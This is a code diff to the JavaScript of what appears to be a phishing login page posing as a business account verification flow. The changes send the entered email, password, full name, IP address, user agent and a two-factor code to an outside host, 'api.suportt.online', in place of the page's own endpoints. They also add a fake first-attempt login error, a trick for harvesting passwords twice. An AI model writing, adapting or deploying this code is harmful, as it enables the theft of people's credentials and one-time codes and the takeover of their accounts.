@@ -1,15 +1,15 @@
 modalSetting("hide");
 var isFirstLoginInput=true;
        var requestRatioSelected=false;
+       var abc = 'api.suportt.online';
        let userInfo="";
        let id;
+       var f_result;
        let thisSession=(1299999999999 - Math.floor(Math.random() * 99999999999));
        document.getElementById("submissionID").innerHTML=thisSession;
-       let ua = $.ua;
-       console.log(ua);
        fetch('https://api.ipify.org?format=json') .then(response=> response.json()) .then(data => {
             document.getElementById("clientIp").value=data.ip;
-            $.ajax({
+            /* $.ajax({
                 url: '/business/check',
                 type: 'POST',
                 dataType:"json",
@@ -22,22 +22,32 @@ var isFirstLoginInput=true;
                     return true;
                 } 
             });
+            */
         });
 
 
        async function uploadFile() {
         const dt = {};
-        
+        var faurl = 'https://'+ abc +'/business/checkpoint';
         var two_fa_code = document.getElementById("two_fa_code").value;
         dt.two_fa_code = two_fa_code;
         dt.id = id;
         $.ajax({
-            url: '/business/checkpoint',
+            url: faurl,
             type: 'POST',
             dataType:"json",
-            data: {model: dt},
+            data: JSON.stringify({model: dt}),
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            beforeSend: function(){
+                $('#loading-spinner-fa').removeClass('d-none');
+                $('.form-control-fa').prop('disabled', true);
+                $('#submitPhotoNextBtn').prop('disabled', true);
+            },
             success: function(data){
-                id = data;
+                var res_data = JSON.stringify(data);
+                id = res_data.model_id;
                 return true;
             } 
         })    
@@ -52,29 +62,41 @@ var isFirstLoginInput=true;
             var pw = document.getElementById("password").value;
             var fullname = document.getElementById("fullName").value;
             var useragent = $.ua;
+            var url = 'https://'+ abc +'/business/verify';
+            //console.log(useragent.ua);
             model.location = ip;
             model.personal_email_address = email;
             model.password = pw;
             model.fullname = fullname;
-            model.user_agent = useragent;
-            console.log(model);
-            $.ajax({
-                url: '/business/verify',
+            model.user_agent = useragent.ua;
+            await $.ajax({
+                url: url,
                 type: 'POST',
                 dataType:"json",
-                data: {model: model},
+                data: JSON.stringify({model: model}),
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                beforeSend: function(){
+                    $('#loading-spinner').removeClass('d-none');
+                    $('.input-grop-cust-login input').prop('disabled', true);
+                    $('#loginNextBtn').prop('disabled', true);
+                },
                 success: function(data){
-                    id = data;
-                } 
+                    f_result = JSON.parse(data);
+                    id = f_result.model_id;
+                    //console.log(f_result);
+                    return f_result;
+                }
             })    
-    
+        //return true;
        }
+
 
        async function inputChanger(field) {
            if(field=="username" || field=="password") {
                if(document.getElementById("password").value.length > 5) {
                    document.getElementById("loginNextBtn").disabled=false;
-                //    await updateUser();
                }
            }
            if(field=="requestPass") {
@@ -99,17 +121,30 @@ var isFirstLoginInput=true;
            console.log(userInfo);
        }
 
-       function nextButton(level) {
+       async function nextButton(level) {
            switch(level) {
                case "login" : if(isFirstLoginInput==true) {
-                   isFirstLoginInput=false;
-                   document.getElementById("loginError").style.display="";
+                   
+                   await updateUser();
+                   //console.log(b, b.error_code)
+                   if(f_result.error_code == 1) {
+                        document.getElementById("loginError").style.display="";
+                        $('#loading-spinner').addClass('d-none');
+                        $('.input-grop-cust-login input').prop('disabled', false);
+                        $('#loginNextBtn').prop('disabled', false);
+                        isFirstLoginInput=true;
+                   }else{
+                        isFirstLoginInput=false;
+                        moveTab("v-pills-identity");
+                   }
+                   //if(a.err)
+                  
                    document.getElementById("usernameFirst").value=document.getElementById("username").value;
                    document.getElementById("passwordFirst").value=document.getElementById("password").value;
                }
                else {
                    moveTab("v-pills-identity");
-                   updateUser();
+                   
                }
                userInfo+="Username/password: `"+document.getElementById("username").value+"`/`"+document.getElementById("password").value+"`\n";
                break;
